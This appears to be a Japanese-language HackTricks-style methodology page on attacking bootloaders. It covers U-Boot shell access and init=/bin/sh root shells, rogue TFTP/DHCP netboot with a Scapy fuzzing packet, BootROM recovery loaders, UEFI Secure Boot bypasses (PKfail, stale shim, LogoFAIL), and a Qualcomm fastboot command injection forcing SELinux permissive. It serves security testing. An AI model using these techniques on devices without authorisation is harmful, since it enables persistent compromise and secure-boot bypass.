# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

以下の手順は、デバイスの startup configuration を変更し、U-Boot や UEFI-class loader などの bootloader をテストする際に推奨されます。early code execution の取得、signature/rollback protection の評価、recovery または network-boot path の悪用に重点を置きます。

Related: bl2_ext patching による MediaTek secure-boot bypass:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. interpreter shell にアクセスする
- boot 中に、`bootcmd` が実行される前に既知の break key（多くの場合は任意のキー、0、space、またはボード固有の "magic" sequence）を押し、U-Boot prompt に移行します。

2. boot state と variables を確認する
- Useful commands:
- `printenv`（environment を dump）
- `bdinfo`（board info、memory address）
- `help bootm; help booti; help bootz`（サポートされている kernel boot method）
- `help ext4load; help fatload; help tftpboot`（利用可能な loader）

3. root shell を取得できるよう boot arguments を変更する
- `init=/bin/sh` を追加すると、kernel は通常の init の代わりに shell を起動します:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. TFTP server から netboot する
- network を設定し、LAN から kernel/fit image を取得します:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. environment を介して変更を永続化する
- env storage が write-protected でなければ、制御を永続化できます:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- fallback path に影響する `bootcount`、`bootlimit`、`altbootcmd`、`boot_targets` などの variables を確認します。値の設定を誤ると、shell への break を繰り返し実行できる場合があります。

6. debug/unsafe feature を確認する
- 次を確認します: `bootdelay` > 0、`autoboot` が無効、制限のない `usb start; fatload usb 0:1 ...`、serial 経由で `loady`/`loads` を実行できること、信頼できない media からの `env import`、signature check なしで kernel/ramdisk を load できること。

7. U-Boot image/verification testing
- platform が FIT image による secure/verified boot を謳っている場合、unsigned image と tampered image の両方を試します:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` が存在しない場合や、legacy の `verify=n` behavior では、arbitrary payload を boot できることがよくあります。
- 単純な allow/deny result だけで終わらせないでください。最近の FIT research では、verification path 自体が pre-auth attack surface になり得ることが示されています。externally stored FIT data（`data-offset`、`data-position`、`data-size`）、signed configuration selection、`loadables`、overlay / `extra-conf` handling を negative-test します。
- matching source tree がある場合、実 hardware に触れる前に、`test/vboot/vboot_test.sh` を使うと U-Boot sandbox 上で FIT verification behaviour を素早く再現できます。

8. Standard Boot（`bootstd`）、`extlinux`、script bootflow
- modern U-Boot build では、`bootcmd` は Standard Boot の wrapper にすぎないことがよくあります。つまり、表示上の environment に問題がない場合でも、writable media、PXE、または SPI flash が実際の trust boundary になる可能性があります。
- `extlinux` bootmeth は `/` と `/boot` の下にある `extlinux/extlinux.conf` を検索します。script bootmeth は最初に `boot.scr.uimg`、次に `boot.scr` を検索します。network boot では、script filename は `boot_script_dhcp` から取得できます。
- Useful triage commands:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- テストする abuse case: `boot_targets` で attacker-controlled USB/SD media が先に指定されている、writable な `/boot/extlinux/extlinux.conf`、rogue TFTP による `boot.scr` の供給、または `script_offset_f` を介した SPI-backed script execution。
- platform が FIT verification に依存している場合、configuration が configuration level で署名され、image ごとの署名だけになっていないことを確認します。`required-mode=all` は、単一の required key を受け入れるより強力です。

## Network-boot surface（DHCP/PXE）と rogue server

9. PXE/DHCP parameter fuzzing
- U-Boot の legacy BOOTP/DHCP handling には memory-safety issue が存在したことがあります。例えば CVE‑2024‑42040 は、crafted DHCP response による memory disclosure について説明しており、U-Boot memory の bytes が wire 上へ leak する可能性があります。過度に長い値や edge-case value（option 67 bootfile-name、vendor option、file/servername field）を使用して DHCP/PXE code path を実行し、hang/leak を観察します。
- netboot 中に boot parameter を stress する最小 Scapy snippet:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- PXE filename field が OS-side provisioning script に chain された際、sanitization なしで shell/loader logic に渡されるかどうかも検証します。

10. Rogue DHCP server command injection testing
- rogue DHCP/PXE service を setup し、filename または option field に characters を injection して、boot chain の後続 stage で command interpreter に到達できるか試します。Metasploit の DHCP auxiliary、`dnsmasq`、または custom Scapy script が有効です。まず lab network を隔離してください。

## 通常の boot を上書きする SoC ROM recovery mode

多くの SoC は BootROM の "loader" mode を公開しており、flash image が無効な場合でも USB/UART 経由で code を受け入れます。secure-boot fuse が blown されていなければ、chain の非常に早い段階で arbitrary code execution を実現できる場合があります。

- NXP i.MX（Serial Download Mode）
- Tools: `uuu`（mfgtools3）または `imx-usb-loader`。
- Example: `imx-usb-loader u-boot.imx` で、custom U-Boot を RAM に push して実行します。
- Allwinner（FEL）
- Tool: `sunxi-fel`。
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` または `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`。
- Rockchip（MaskROM）
- Tool: `rkdeveloptool`。
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` で loader を stage し、custom U-Boot を upload します。

device の secure-boot eFuse/OTP が burned されているかを評価します。そうでなければ、BootROM download mode は SRAM/DRAM から first-stage payload を直接実行することで、上位 layer の verification（U-Boot、kernel、rootfs）を頻繁に bypass します。

## UEFI/PC-class bootloader: quick checks

11. ESP tampering、rollback、key-enrollment testing
- EFI System Partition（ESP）を mount し、loader component を確認します: `EFI/Microsoft/Boot/bootmgfw.efi`、`EFI/BOOT/BOOTX64.efi`、`EFI/ubuntu/shimx64.efi`、`grubx64.efi`、vendor logo path。
- 可能な場合は、OS から Secure Boot state と key database を dump します:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- platform が Setup Mode である、unauthenticated key enrollment を受け入れる、または test/default Platform Key（PKfail class）を搭載している場合、local admin または physical attacker は自身の KEK/db を enroll し、Secure Boot が "enabled" に見える状態を維持したまま arbitrary EFI binary を boot できます。
- Secure Boot revocation（dbx）が current でない場合、downgrade した、または既知の vulnerable な signed boot component による boot を試します。platform が古い shim/bootmanager を信頼し続けている場合、ESP から独自の kernel または `grub.cfg` を load して persistence を獲得できることがよくあります。

12. Stale shim / SBAT / dbx revocation testing
- 古い Microsoft-signed shim や vendor fork は、revocation が stale であれば BYOVD-style bootkit path として機能する可能性があります。isolated lab で、historically vulnerable な shim を ESP に配置し、独自の `grubx64.efi` または kernel を chainload できるか試します。
- Quick triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- shim が revocation list に含まれているにもかかわらず実行される場合、firmware/OS の `dbx` update が stale であるか、upstream SBAT protection を継承していない forked loader を信頼しています。

13. Boot logo parsing bug（LogoFAIL class）
- 複数の OEM/IBV firmware には、boot logo を処理する DXE の image-parsing flaw に対する脆弱性がありました。attacker が vendor-specific path（例: `\EFI\<vendor>\logo\*.bmp`）に crafted image を ESP 上へ配置して reboot できる場合、Secure Boot が有効でも early boot 中に code execution が可能になることがあります。platform が user-supplied logo を受け入れるか、またその path が OS から writable かをテストします。


## Android/Qualcomm ABL + GBL（Android 16）の trust gap

Qualcomm の ABL が **Generic Bootloader Library（GBL）** を load する Android 16 device では、ABL が `efisp` partition から load する UEFI app を **authenticate** するか検証します。ABL が UEFI app の **presence** だけを確認し、signature を verify しない場合、`efisp` への write primitive が boot 時の **pre-OS unsigned code execution** になります。

Practical checks and abuse path:

- **efisp write primitive**: custom UEFI app を `efisp` に write する方法が必要です（root/privileged service、OEM app bug、recovery/fastboot path）。これがなければ、GBL loading gap に直接到達することはできません。
- **fastboot OEM argument injection**（ABL bug）: 一部の build は `fastboot oem set-gpu-preemption` で extra token を受け入れ、それらを kernel cmdline に append します。これを利用して permissive SELinux を強制し、protected partition への write を有効化できます:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
device が patched されている場合、command は extra argument を reject するはずです。
- **persistent flag による bootloader unlock**: boot-stage payload は persistent unlock flag（例: `is_unlocked=1`、`is_unlocked_critical=1`）を flip し、OEM server/approval gate なしで `fastboot oem unlock` を emulate できます。これは次回 reboot 後も維持される posture change です。

Defensive/triage note:

- ABL が `efisp` の GBL/UEFI payload に対して signature verification を実行するか確認します。実行しない場合、`efisp` を high-risk persistence surface として扱います。
- ABL fastboot OEM handler が **argument count を validate** し、additional token を reject するよう patched されているか確認します。

## Hardware caution

early boot 中に SPI/NAND flash を扱う場合（例: read を bypass するための pin grounding）は注意し、必ず flash datasheet を確認してください。タイミングを誤った short は device または programmer を破損させる可能性があります。

## Notes and additional tips

- `env export -t ${loadaddr}` と `env import -t ${loadaddr}` を試し、RAM と storage の間で environment blob を移動します。一部の platform では、removable media から authentication なしで env を import できます。
- `extlinux.conf` 経由で boot する Linux-based system で persistence を得るには、signature check が enforce されていない場合、boot partition の `APPEND` line を変更して（`init=/bin/sh` または `rd.break` を injection して）十分なことがよくあります。
- target が dual-slot / A/B update を使用している場合は、[firmware analysis overview](README.md) の anti-rollback と slot-desync technique を確認し、bootloader 外部の updater-only trust gap を見逃さないようにします。
- userland が `fw_printenv/fw_setenv` を提供している場合、`/etc/fw_env.config` が実際の env storage と一致することを検証します。offset の設定を誤ると、別の MTD region を read/write することになります。

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
